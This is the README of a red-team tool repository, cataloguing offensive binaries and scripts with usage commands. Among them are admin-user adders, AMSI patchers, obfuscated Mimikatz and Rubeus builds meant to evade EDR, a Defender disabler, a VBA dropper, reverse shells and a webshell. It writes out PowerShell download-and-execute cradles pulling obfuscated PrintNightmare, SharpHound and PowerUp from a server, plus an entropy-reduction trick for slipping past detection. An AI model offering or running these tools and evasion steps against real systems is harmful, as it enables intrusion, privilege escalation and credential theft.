# Red Team Arsenal

Some binaries/scripts that may be useful in red team/pentest exercises.

Most of the stuff here is far from fancy or the best solution possible, sorry :(... they just do the job and might come in handy for you in some way.

---

* addbyimpersonation.cpp: A modified version of sensepost's [impersonate](https://github.com/sensepost/impersonate) to only impersonate a token and add a new local admin/domain admin user to a computer/domain.
	*  `.\addbyimpersonation.exe list` to list tokens.
	*  `.\addbyimpersonation.exe adduser <token_ID> <username> <password> <server>` to add a new user impersonating the \<token_ID>. If \<server> is a DC, it will add a new domain user. If \<server> is a regular domain computer, it will add a new local user (SAM).
	*  `.\addbyimpersonation.exe addtodomaingroup <token_ID> <username> <domain_group> <server>` to add an existing domain user to a domain group.
	*  `.\addbyimpersonation.exe addtolocalgroup <token_ID> <username> <local_group> <server>` to add an existing local user/domain user to a local group (e.g. builtin "Administrators" group).
* GetNPUsers.exe: GetNPUsers.py from impacket compiled to .exe via pyinstaller.
* b_python.exe: BloodHound.py project compiled to .exe via cx\_Freeze. You may want to run this with `--disable-pooling` flag.
	* `.\b_python.exe -u <username> -p <pass> -d <domain> -dc <dc_fqdn> -gc <dc_fqdn> -ns <dc_ip> -c all --disable-pooling` 
* generate\_malicious\_lnk.ps1: Malicious .lnk generator (with wordpad.exe icon).
* CreateSymlink.exe: Precompiled "CreateSymlink.exe" from James Forshaw's
* html\_smuggling\_loader.html: A HTML smuggling template.
* hook\_detector.cs: EDR Hooks Detector in C#. Modify the code to include other win32 APIs.
* find\_cpassword\_sysvol.ps1: A simple ps1 script to search for "cpassword" references in SYSVOL folder.
* find\_pwd\_shared\_folder.ps1: A simple ps1 script to search for password/juicy references in a given shared folder. Modify `$ComputerName`, `$DomainName` and `$SharedFolder` variables accordingly.
* crackmapexec.exe: CrackMapExec compiled to .exe.
* crackmapexec_t.exe: CrackMapExec compiled to .exe with reduced entropy to bypass some specific EDRs (~~CS Falcon~~).
* AMSI\_bypass\_cross\_project.cpp: Patch AMSI in a given PID (C++). 
	* `.\AMSI_bypass_cross_project.exe <PID>`
* amsi\_patching\_go.go: Patch AMSI in a given PID (go). 
	* `.\amsi_patching_go.exe <PID>`
* amsipythonbypass.zip: AMSI patching implemented in Python. Extracted from FluidAttacks [post](https://fluidattacks.com/blog/amsi-bypass-python/).
* add\_user\_dll.cpp / adduser.dll: DLL that adds a new local admin user when loaded. Dynamically look up for local Administrators group name and add the user using windows APIs to avoid using net.exe/net1.exe.
* add\_user\_dll2.cpp: DLL that adds a new local admin user when loaded (via system(net.exe...) method).
* Invoke-Mimikatz.ps1: Powershell mimikatz with some minor bug fixes.
* SpoolSample.exe: SpoolSample precompiled binary (printerbug).
* bin\_to\_uuids.py: .bin to uuids converter, useful for UUID injection.
	* `python3 bin_to_uuids.py payload.bin`
* aes\_sektor7.py: AES256 encryption script extracted from Sektor7. Modified this to also save an `encrypted.bin` file that later may be imported as .rsrc in a maldev template. 
	* `python3 aes_sektor7.py payload.bin`, it will generate a encrypted.bin on /tmp.
* decrypt_aes.cpp: AESdecrypt sample.
* SharpPrintNightmare.exe: SharpPrintNightmare precompiled binary.
* obf-sharphound.ps1: SharpHound.ps1 obfuscated by pyfuscation.
	* `IEX (New-Object Net.WebClient).DownloadString("https://<SERVER>/obf-sharphound.ps1"); undertow -GdHcDvjN99 all`
* obf-pnightmare.ps1: PrintNightmare obfuscated by pyfuscation.
	* `IEX (New-Object Net.WebClient).DownloadString("https://<SERVER>/obf-pnightmare.ps1"); essentially -Dll "C:\Users\public\Desktop\adduser.dll"`
* obf-pup.ps1: Powerup obfuscated by pyfuscation.
	* `IEX (New-Object Net.WebClient).DownloadString("https://<SERVER>/obf-pup.ps1"); pave`
* rpivot.exe: rpivot.py compiled to .exe through cx\_freeze. Useful to establish SOCKS proxy communication in legacy powershell versions (e.g. v2).
	* `.\rpivot.exe --server-ip <IP> --server-port <PORT>`
	*  On remote server: `python3 server.py --server-IP <IP> --server-port <PORT> --proxy-ip 127.0.0.1 --proxy-port 1080`
* ch.exe: chisel.exe + limelighter project.
* netman\_sth.exe / netman\_sth\_x86.exe: A more stealth NetMan service trigger. Used to exploit a well known DLL hijacking when we have a writeable %PATH% directory in Windows Servers ([reference](https://itm4n.github.io/windows-server-netman-dll-hijacking/)). 
* WSuspicious.exe: WSUSpicious precompiled binary.
* Rubeus\_encrypted.exe: Rubeus encrypted by nimcrypt2.
* Rubeus.xml: Rubeus.xml to be executed with msbuild.exe.
* SharpKatz.xml: SharpKatz.xml to be executed with msbuild.exe.
* SharpPrintNightmare.exe: Precompiled SharpPrintNightmare.
* c.exe: Certify.exe + InvisibilityCloak obfuscation.
* dictionary.txt: Just a english dictionary to be appended on binaries to reduce entropy.
	* `cat dictionary.txt >> t.exe`
	* Check compressibility: `gzip -v -c t.exe > /dev/null`
* only\_sam\_dump.exe / only\_sam\_dump.py: Python script (compiled to .exe) to dump SAM/SYSTEM hives only. Based on secretsdump script. Created just to evade some EDR products.
* secretsdump.exe: secretsdump compiled to .exe via cx\_freeze.
* smbmap.exe: smbmap project compiled to .exe.
* weblogic\_pw\_decryptor.py: A decryptor to weblogic passwords contained in config.xml
* keytabextract.py: Python script to extract NTLM Hashes from KeyTab files
	* `./keytabextract.py <keytabfile>`
* mimi\_peruns\_fart.exe: A more stealth mimikatz.exe (donut + payload encryption + peruns fart applied)
* m\_obf2.exe: Mimikatz + Inceptor project
* mimikatz-nimcrypt2.exe: Mimikatz.exe encrypted with nimcrypt2 project
* dropper.vba: A simple VBA dropper. C# code extracted from .DOCX/.XLSX "comments" section (`ActiveDocument.BuiltInDocumentProperties("Comments").Value`)
* xor.cs: A XOR template in C#.
* CVE-2020-14882.py: Python script to exploit CVE-2020-14882.
* dwrite.dll: DLL used to exploit a DLL sideloading on Microsoft Teams (Microsoft Teams searches for this non-existent DLL on its startup).
* windows\_license.vbs: VBS to extract windows licenses... old content.
* disable-defender.ps1: A ps1 script to disable Windows Defender.
* dllinj.go: Process injection implemented in golang.
* screenshot.ps1: A ps1 script to take a desktop screenshot. Modify the `$File` variable to specify the location for saving the .bmp image.
* bleedhound.zip: An obfuscated version of BloodHound project.
* merge\_nessus\_files.py: Python script to merge multiple .nessus files.
* modshadowpass.sh: Useful to modify passwords when we have write privileges to /etc/shadow (this is NOT opsec-friendly :)
* reverse\_shell.py: A simple revshell in py... old content, you may want to use https://www.revshells.com/.
* reverse\_shell.sh: A simple revshell in sh... old content, you may want to use https://www.revshells.com/.
* systracing_cve-2020-0668.txt: Steps to reproduce CVE-2020-0668.
* webshell.aspx: ASP.NET webshell. A defined "AUTHKEY" is required to interact with it (line 8).

